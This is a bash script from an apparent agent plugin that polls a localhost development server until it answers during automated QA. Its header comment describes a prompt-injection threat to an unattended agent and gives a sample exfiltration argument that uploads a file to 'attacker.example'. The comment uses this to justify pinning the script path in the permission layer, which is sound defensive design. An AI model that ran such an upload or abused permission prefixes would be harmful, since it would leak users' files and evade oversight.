#!/usr/bin/env bash
# poll-dev-server.sh — readiness poll for the development server the configured
# `commands.devServer` starts for an automated QA phase.
#
# WHY THIS IS A SCRIPT AND NOT AN INLINE POLL. It encapsulates the
# `curl -sf -o /dev/null http://localhost:<port>` poll loop INSIDE a single
# script so the permission layer sees ONE pinned script path instead of an open
# prefix. A direct allow on `curl -sf http://localhost:*` is a PREFIX match —
# anything after `http://localhost:` is auto-approved in an unattended session,
# INCLUDING extra arguments (e.g. `-d @<file> https://attacker.example`), which
# would hand an injected task prompt a network-egress plus file-upload
# primitive. The prefix-glob permission syntax cannot express "localhost plus
# digits only", so pinning this script is the fix — the same rationale
# `find-free-port.sh` and `kill-dev-server.sh` document for their loop and pipe
# encapsulation.
#
# Prerequisite: `curl` on PATH. This script reads no configuration and needs no
# repository: its port and timeout arrive as arguments.
#
# Used by `${CLAUDE_PLUGIN_ROOT}/instructions/plan_orchestration_instructions_core.md`
# (`## Phase E — QA testing` → `### E.0 Start the dev server`, step 3) and by
# `${CLAUDE_PLUGIN_ROOT}/instructions/qa_test_instructions.md`
# (`### 2. Start the dev server (background)`, step 3).
#
# Usage: poll-dev-server.sh <port> [timeout_seconds]   (timeout default 60)
# Polls http://localhost:<port> with a short sleep between attempts — never a
# fixed sleep as the readiness signal — until the timeout elapses. Exits 0 on
# the first answer; prints a one-line error to stderr and exits 1 on timeout
# (callers treat a non-zero exit as the "QA dev server failed to start" stop
# condition). A non-numeric port or timeout is rejected the same way.
#
# CALLERS MUST STILL VERIFY THEIR OWN PROCESS IS ALIVE. A 0 exit only means
# SOMETHING answered on that port — an answer from a different run's server on
# the same port exits 0 here just as readily. Confirm the background dev-server
# process you started is still running before trusting it.
#
# REPRO — reproduce any decision by hand:
#
#   bash plugin/scripts/poll-dev-server.sh 3001 2
#
#   a server answering on the port  -> no output, exit 0, promptly
#   a free port                     -> one stderr line after ~the timeout, exit 1
#   non-numeric port or timeout     -> one stderr line, exit 1, immediately

set -u

port="${1:-}"
timeout="${2:-60}"

case "$port" in
  ''|*[!0-9]*)
    echo "poll-dev-server: usage: poll-dev-server.sh <port> [timeout_seconds] (port must be numeric, got '${port}')" >&2
    exit 1
    ;;
esac

case "$timeout" in
  ''|*[!0-9]*)
    echo "poll-dev-server: timeout must be numeric, got '${timeout}'" >&2
    exit 1
    ;;
esac

deadline=$((SECONDS + timeout))

while [ "$SECONDS" -lt "$deadline" ]; do
  if curl -sf -o /dev/null "http://localhost:${port}"; then
    exit 0
  fi
  sleep 1
done

echo "poll-dev-server: http://localhost:${port} did not answer within ${timeout}s" >&2
exit 1
